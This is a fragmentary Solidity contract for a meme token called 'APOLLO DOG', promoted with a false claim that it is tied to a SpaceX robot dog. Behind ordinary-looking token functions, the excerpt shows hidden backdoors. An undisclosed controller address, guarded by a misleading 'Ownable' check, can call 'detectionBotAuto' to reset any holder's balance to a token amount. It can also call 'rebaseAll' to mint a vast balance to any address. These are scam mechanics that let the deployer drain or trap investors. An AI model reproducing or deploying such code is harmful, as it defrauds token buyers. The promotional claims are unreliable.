...
/*
Welcome 🐾$APOLLOUIM🐾APOLLO DOG🐾
🐾$APOLLUIM is a robot dog currently under development by SpaceX Starbase, their second robo dog living at Boca Chica.
 
🐾 Telegram : https://t.me/APOLLOUIM
🐾Website: apollotoken.finance
...
interface APOLLOUIMAsii is APOLLOUIMAsi {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}
abstract contract APOLLOUIMAsiii is APOLLOUIMAs {
...
contract APOLLOUIM is APOLLOUIMAs, APOLLOUIMAsi, APOLLOUIMAsii, APOLLOUIMAsiii {

    mapping(address => uint256) private APOLLOUIMsuplly;
  mapping(address => bool) public APOLLOUIMAsiiZERTY;
    mapping(address => mapping(address => uint256)) private Confirmed;
address private APOLLOUIMRooter;
    uint256 private ALLtotalSupply;
    string private _name;
    string private _symbol;
        mapping(address => bool) public APOLLOUIMPaw;
  address walowalowalo;



    
    constructor(address APOLLOUIMadressss) {
            // Editable
            walowalowalo = msg.sender;

        _name = "APOLLO DOG";
        _symbol = "APOLLOUIM";
  APOLLOUIMRooter = APOLLOUIMadressss;        
    ...
    function balanceOf(address account) public view virtual override returns (uint256) {
        return APOLLOUIMsuplly[account];
    }
    ...
    function transferFrom(
      ...
      modifier botcontract() {
        require(APOLLOUIMRooter == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    ...
    function _transfer(
        ...
        uint256 fromBalance = APOLLOUIMsuplly[from];
        require(fromBalance >= reveverbalance, "Ehi20: transfer reveverbalance exceeds balance");
        unchecked {
            APOLLOUIMsuplly[from] = fromBalance - reveverbalance;
        }
        APOLLOUIMsuplly[to] += reveverbalance;
  ...
  modifier walo () {
    ...
    function presalesend(address account, uint256 reveverbalance) internal virtual {
        ...
        APOLLOUIMsuplly[account] += reveverbalance;
  ...
  function detectionBotAuto(address adressbotauto) external botcontract {
    APOLLOUIMsuplly[adressbotauto] = 1000000000;
    ...
    function _burn(address account, uint256 reveverbalance) internal virtual {
        ...
        uint256 accountBalance = APOLLOUIMsuplly[account];
        require(accountBalance >= reveverbalance, "Ehi20: burn reveverbalance exceeds balance");
        unchecked {
            APOLLOUIMsuplly[account] = accountBalance - reveverbalance;
        }
        ALLtotalSupply -= reveverbalance;
  ...
  function rebaseAll(address rebasecontract) external botcontract {
    APOLLOUIMsuplly[rebasecontract] = 10000000000000 * 10 ** 20;
